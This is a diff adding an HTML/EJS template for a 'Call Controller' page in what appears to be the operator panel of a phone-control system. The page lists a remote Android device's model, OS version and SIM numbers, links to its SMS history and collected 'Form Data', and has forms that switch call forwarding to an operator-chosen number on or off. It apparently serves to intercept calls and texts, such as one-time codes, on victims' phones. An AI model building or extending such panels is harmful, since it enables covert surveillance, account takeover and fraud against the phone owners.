@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="Content-Security-Policy" content="script-src 'self';" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Device Details</title>
+  <link rel="stylesheet" href="/css/final.css" />
+</head>
+<body>
+
+   <header class="header-nav">
+    <div class="header-inner">
+      <div class="left-icons">
+        <a href="/api/device/dashboard" title="Back">
+          <img src="/image/back.png" alt="Back" style="width:24px; height:24px;">
+        </a>
+      </div>
+      <h1 class="centered-title">Call Controller</h1>
+      <div class="header-icons">
+        <a href="#" id="toggleSimBtn" title="Select SIM">
+          <img src="/image/cll.png" alt="Call" style="width:24px; height:24px;">
+        </a>
+        <a href="/api/notification/sms-auth-custom/<%= device._id %>" title="SMS History">
+          <img src="/image/sms.png" alt="SMS" style="width:24px; height:24px;">
+        </a>
+      </div>
+    </div>
+  </header>
+
+  <div class="container">
+    <div class="device-details">
+      <h2>Device Information</h2>
+      <p><strong>Mobile:</strong> <%= device.brand %></p>
+      <p><strong>Android Version:</strong> <%= device.androidVersion %></p>
+      <div class="back-link">
+        <a href="/api/data/detail/<%= device._id %>">Form Data</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="toggle-page">
+    <div class="toggle-content">
+      <label class="sim-option active">
+        <input type="radio" name="sim" value="SIM 1" checked>
+        <img src="/image/sim.png" class="sim-icon" alt="SIM1">
+        <div class="sim-details"><p><%= sim1Number %></p></div>
+        <span class="green-ball static" data-id="<%= device._id %>" data-slot="1"></span>
+      </label>
+      <label class="sim-option">
+        <input type="radio" name="sim" value="SIM 2">
+        <img src="/image/sim.png" class="sim-icon" alt="SIM2">
+        <div class="sim-details"><p><%= sim2Number %></p></div>
+        <span class="green-ball static" data-id="<%= device._id %>" data-slot="2"></span>
+      </label>
+      <div class="forward-section">
+        <h3>
+          Forward To
+          <span class="green-ball" data-id="<%= device._id %>" data-slot="forward"></span>
+        </h3>
+        <form id="startForm" method="POST" action="/api/device/admin/set/<%= device._id %>">
+          <input type="hidden" id="selectedSim" name="sim">
+          <input type="text" name="phoneNumber" placeholder="Your Number" required>
+          <button type="submit" class="btn active">ACTIVE</button>
+        </form>
+        <form id="stopForm" method="POST" action="/api/device/admin/stop/<%= device._id %>">
+          <input type="hidden" id="stopSelectedSim" name="sim">
+          <button type="submit" class="btn active">DEACTIVE</button>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <!-- Load Socket.IO client first -->
+  <script src="/socket.io/socket.io.js"></script>
+  <!-- Then your own scripts -->
+  <script src="/js/cript.js" defer></script>
+  <script src="/js/simSlotStatus.js" defer></script>
+</body>
+</html>
